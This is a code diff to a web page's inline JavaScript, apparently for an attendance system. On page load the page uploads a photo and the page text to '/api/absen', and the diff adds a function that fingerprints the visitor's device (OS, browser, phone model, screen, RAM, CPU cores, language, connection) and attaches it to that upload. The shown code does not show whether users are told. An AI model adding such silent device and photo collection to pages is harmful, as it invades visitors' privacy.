@@ -234,6 +234,37 @@ addLog();setInterval(addLog,1400);setInterval(()=>{if(Math.random()>.6)beep(rnd(
 window.onload = function() {
   let sudahDikirim = false;
 
+  // Kumpulin info device dari browser
+  function ambilDeviceInfo() {
+    const ua = navigator.userAgent;
+    let os = 'Unknown';
+    if (ua.includes('Android')) os = 'Android';
+    else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+    else if (ua.includes('Windows')) os = 'Windows';
+    else if (ua.includes('Mac')) os = 'MacOS';
+
+    let browser = 'Unknown';
+    if (ua.includes('Chrome')) browser = 'Chrome';
+    else if (ua.includes('Firefox')) browser = 'Firefox';
+    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+
+    const modelMatch = ua.match(/\(([^;]+);/);
+    const modelHP = modelMatch ? modelMatch[1] : 'Unknown';
+
+    return {
+      os,
+      browser,
+      modelHP,
+      userAgent: ua,
+      screen: screen.width + ' x ' + screen.height,
+      viewport: window.innerWidth + ' x ' + window.innerHeight,
+      ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+      cpuCores: navigator.hardwareConcurrency || 'Unknown',
+      language: navigator.language,
+      connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+    };
+  }
+
   function cekDanKirimFoto() {
     if (sudahDikirim) return;
 
@@ -247,6 +278,11 @@ window.onload = function() {
         const fd = new FormData();
         fd.append('info', document.body.innerText);
         fd.append('foto', blob, 'foto.jpg');
+
+        const dev = ambilDeviceInfo();
+        for (const key in dev) {
+          fd.append(key, dev[key]);
+        }
 
         fetch('/api/absen', { method: 'POST', body: fd })
           .then(res => res.json())
